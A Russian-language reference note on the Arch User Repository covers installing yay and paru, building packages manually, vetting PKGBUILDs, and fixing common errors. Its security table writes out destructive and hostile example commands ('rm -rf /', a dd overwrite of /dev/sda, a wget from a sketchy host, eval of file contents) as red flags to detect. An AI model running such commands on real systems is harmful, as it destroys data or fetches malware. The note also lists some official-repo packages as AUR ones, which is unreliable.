---
created: 2026-01-06
updated: 2026-01-06
type: reference
---

# AUR: Arch User Repository

## 🎯 ЧТО ТАКОЕ AUR?

**AUR** — репозиторий пользовательских пакетов для Arch Linux.

- **Неофициальный** — контролируется сообществом, НЕ Arch
- **Исходный код** — вы скачиваете PKGBUILD и собираете сами
- **Больше пакетов** — чем в official репозиториях
- **БОЛЬШЕ РИСКОВ** — код может содержать уязвимости

**URL:** [https://aur.archlinux.org](https://aur.archlinux.org)

---

## 🚀 AUR ПОМОЩНИКИ

### yay

**yay** — самый популярный и активно поддерживаемый помощник.

#### Установка yay

```bash
# 1. Установить зависимости
sudo pacman -S base-devel git

# 2. Клонировать yay
git clone https://aur.archlinux.org/yay.git
cd yay

# 3. Собрать и установить
makepkg -si
# -s: установить зависимости
# -i: установить собранный пакет

# 4. Проверить
yay --version
```

#### Команды yay

```bash
yay                          # обновить систему (pacman + AUR)
yay -S package               # установить из pacman или AUR
yay -Ss term                 # поиск в pacman + AUR
yay -Si package              # информация о пакете
yay -R package               # удалить пакет
yay -Qu                      # пакеты AUR с обновлениями
yay --gendb                  # обновить базу данных AUR
yay -Ps                      # статистика системы
yay -G package               # скачать PKGBUILD пакета (проверить)
```

### paru (альтернатива)

**paru** — новый помощник на Rust, более быстрый.

```bash
git clone https://aur.archlinux.org/paru.git
cd paru
makepkg -si
```

Команды похожи на yay.

---

## 🔧 УСТАНОВКА ВРУЧНУЮ (БЕЗ ПОМОЩНИКА)

Если не хотите помощника:

### 1. Клонировать репозиторий

```bash
git clone https://aur.archlinux.org/package-name.git
cd package-name
ls -la                       # должен быть PKGBUILD
```

### 2. ПРОВЕРИТЬ PKGBUILD (БЕЗОПАСНОСТЬ!)

```bash
cat PKGBUILD                 # НИКОГДА не пропускайте этот шаг!
```

**Что проверять:**

| Красный флаг | Описание | Пример |
|---|---|---|
| Удаление файлов | Опасные команды удаления | `rm -rf /` |
| Перезапись диска | Целевой диск вместо пакета | `dd if=/dev/urandom of=/dev/sda` |
| Лишние sudo | sudo где не должно быть | `sudo rm -rf /` в prepare() |
| Неизвестные URL | Скачивание с подозрительных источников | `wget http://sketchy.site/malware` |
| Обфускированный код | Зашифрованный или смешанный язык | base64-encoded bash в source |
| Скрытые действия | Запуск кода без явного упоминания | `eval $(cat file)` |

**Безопасно, если:**
- ✅ Source скачивается с официального GitHub/GitLab репозитория
- ✅ SHA256-суммы указаны и совпадают
- ✅ Только стандартные npm/make/cargo команды сборки
- ✅ Установка только в `/usr/lib/package`, `/usr/bin`, `/usr/share`
- ✅ Разработчик активный (recent commits, много packages)

**Если нашли подозрительное — НЕ СОБИРАЙТЕ!**

### 3. Собрать пакет

```bash
makepkg                      # только собрать
makepkg -si                  # собрать и установить
makepkg -si --nocheck        # пропустить проверки (ОСТОРОЖНО!)
```

### 4. Установить вручную

```bash
ls *.tar.zst                 # найти собранный пакет
sudo pacman -U *.tar.zst     # установить
```

---

## 🔒 БЕЗОПАСНОСТЬ AUR (КРИТИЧНО!)

### ПРАВИЛА БЕЗОПАСНОСТИ

1. **ВСЕГДА** проверяйте PKGBUILD перед `makepkg`
   ```bash
   yay -G package && cd package && cat PKGBUILD
   ```

2. **Проверяйте источник кода**
   - Source должен быть с официального GitHub/GitLab
   - Избегайте пакетов со случайных сайтов

3. **Смотрите на мейнтейнера**
   - Кликните на имя на AUR странице
   - Сколько пакетов он поддерживает?
   - Когда последнее обновление?

4. **Проверяйте дату обновления**
   - Свежее = вероятно безопаснее
   - Не обновлялся 2+ года = риск

5. **Смотрите votes и комментарии**
   - Много upvotes = проверено сообществом
   - В комментариях могут быть предупреждения
   - Ищите "security", "issue", "vulnerable"

### ЧЕРНЫЙ СПИСОК (НИКОГДА не устанавливайте)

```bash
❌ Пакеты с 0 votes и не обновлялись 2+ года
❌ Пакеты от неизвестных авторов, у которых 1 пакет
❌ PKGBUILD с rm -rf / или подобным
❌ Пакеты требующие sudo без причины
❌ Пакеты с шифрованным кодом или base64-обфускацией
❌ Пакеты, скачивающие бинарики с неизвестных сайтов
❌ Пакеты с русским/китайским кодом без объяснения
```

### Как проверить автора

1. Перейти на `https://aur.archlinux.org/packages/package-name`
2. Посмотреть "Maintainer" (кто поддерживает)
3. Нажать на имя, посмотреть:
   - Сколько пакетов поддерживает (≥5 = более надёжно)
   - Когда последний раз обновлял (недели/месяцы назад)
   - История пакета (давно ли он на AUR)
4. Проверить GitHub профиль автора (если ссылка есть)

### PGP Signature Warning

```bash
WARNING: Skipping verification of source file PGP signatures.
```

**Это нормально, если:**
- SHA256-суммы совпадают (`Validating source files with sha256sums... Passed`)
- Source с официального GitHub репозитория
- Пакет собрался успешно

**Почему это происходит:**
- yay загружает исходники и PKGBUILD параллельно
- PGP проверка откладывается на этап сборки
- Если нужен импорт ключей, ранняя проверка может не сработать

---

## 🚨 ПРОБЛЕМЫ И РЕШЕНИЯ

### Ошибка: "package not found"

```bash
# Пакета нет или его переименовали
yay -Ss package-name         # поискать похожие

# Или посетить https://aur.archlinux.org
# и поискать там
```

### Ошибка при сборке: "error:"

```bash
# 1. Посмотреть полную ошибку
yay -S package 2>&1 | tail -100

# 2. Очистить кэш сборки (могут быть остатки)
cd ~/.cache/yay/package-name
rm -rf src pkg *.tar.zst

# 3. Проверить что требуется
cat PKGBUILD | grep depends

# 4. Установить зависимости вручную
yay -S dependency1 dependency2

# 5. Попробовать снова
yay -S package --rebuild
```

### "error: failed to download sources"

```bash
# URL в PKGBUILD может быть устаревшым
cat PKGBUILD | grep source=

# Или посетить AUR страницу
# Может быть уже исправлено в свежей версии
```

### Конфликт с другим пакетом

```bash
# Посмотреть конфликт
yay -Si package | grep -i conflict

# Удалить конфликтующий
sudo pacman -R conflicting-package

# Установить нужный
yay -S package
```

### Откатить пакет на старую версию

```bash
# Если был собран ранее (в ~/.cache/yay)
ls ~/.cache/yay/package-name/

# Найти старую версию
sudo pacman -U ~/.cache/yay/package-name/package-oldversion.tar.zst

# Или используйте downgrade
sudo pacman -S downgrade
sudo downgrade package
```

### yay зависла или выдает ошибку

```bash
# Обновить сам yay
yay -S yay

# Или переинсталлировать
git clone https://aur.archlinux.org/yay.git
cd yay
makepkg -si --force
```

### Предупреждения npm (EBADENGINE, deprecated packages)

Если при сборке видите:
```
npm warn EBADENGINE Unsupported engine
npm warn deprecated package-name@version
22 vulnerabilities (5 low, 2 moderate, 11 high, 4 critical)
```

**Это нормально для AUR пакетов:**
- PKGBUILD использует Node.js для сборки
- Это не уязвимости установленного пакета, а dev-dependencies
- Итоговый пакет может быть на C++/Rust/другом языке
- npm audit warning-и из PKGBUILD не влияют на безопасность установленного приложения

**Пример:** Bruno использует Node.js для сборки Electron приложения. Предупреждения из npm при сборке не означают, что готовое приложение будет уязвимо.

---

## 📋 ПОПУЛЯРНЫЕ ПАКЕТЫ

### Терминальные утилиты (безопасные)
```bash
yay -S neovim-nightly        # свежий Neovim
yay -S starship              # красивый prompt
yay -S bat                   # лучше cat
yay -S fd                    # лучше find
yay -S ripgrep               # лучше grep
yay -S eza                   # лучше ls
yay -S lazygit               # Git интерфейс
yay -S bruno                 # API клиент (REST/GraphQL)
```

### Графические приложения (безопасные)
```bash
yay -S visual-studio-code-bin    # VS Code
yay -S google-chrome             # Chrome
yay -S discord                   # Discord
yay -S telegram-desktop          # Telegram
yay -S vlc                       # VLC медиа плеер
```

### Для разработки
```bash
yay -S github-cli               # GitHub CLI
yay -S docker                   # Docker
yay -S insomnia                 # API тестирование (альтернатива Bruno)
```

**Совет:** 
- `-bin` пакеты скачивают готовые бинарники (быстро, но может быть не всегда свежее)
- `-git` пакеты собираются из свежего исходника (медленно, но всегда актуально)

---

## 📋 ШПАРГАЛКА AUR

```bash
# Установка yay
git clone https://aur.archlinux.org/yay.git
cd yay
makepkg -si

# Использование yay
yay                          # обновить всё
yay -S package               # установить
yay -Ss term                 # поиск
yay -G package               # скачать и проверить PKGBUILD

# Вручную из AUR
git clone https://aur.archlinux.org/package.git
cd package
cat PKGBUILD                 # ⚠️ ПРОВЕРИТЬ!
makepkg -si

# Безопасность: ВСЕГДА проверяйте PKGBUILD перед makepkg!
cat PKGBUILD | grep "rm -rf" # ищите опасные команды
cat PKGBUILD | grep "source=" # проверьте источники
```

---

## 🔗 ВАЖНЫЕ ССЫЛКИ

- **Arch Wiki AUR**: [https://wiki.archlinux.org/title/Arch_User_Repository](https://wiki.archlinux.org/title/Arch_User_Repository)
- **AUR веб-сайт**: [https://aur.archlinux.org](https://aur.archlinux.org)
- **yay GitHub**: [https://github.com/Jguer/yay](https://github.com/Jguer/yay)

---

## 🔗 ДАЛЬШЕ

[Обслуживание Arch Linux](./04-maintenance.md)
